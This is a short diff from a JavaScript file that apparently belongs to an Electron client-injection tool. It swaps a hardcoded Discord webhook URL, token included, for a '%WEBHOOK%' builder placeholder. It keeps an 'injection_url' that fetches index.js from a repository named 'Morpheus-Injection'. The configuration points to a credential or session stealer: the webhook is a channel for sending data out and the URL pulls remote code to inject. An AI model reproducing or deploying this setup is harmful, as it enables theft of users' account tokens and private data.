@@ -9,7 +9,7 @@ const { BrowserWindow, session, app } = require("electron");
 
 const CONFIG = {
   webhook:
-    "https://discord.com/api/webhooks/1240687565141577779/JAzwR2xEbYaC8vbnEw5dtZOiBpYgYzWfbrVApOITjMh2MYO7W7o3IqD7oRav1fZljgtH",
+    "%WEBHOOK%",
   injection_url:
     "https://raw.githubusercontent.com/Nyxoy201/Morpheus-Injection/main/index.js",
   filters: {
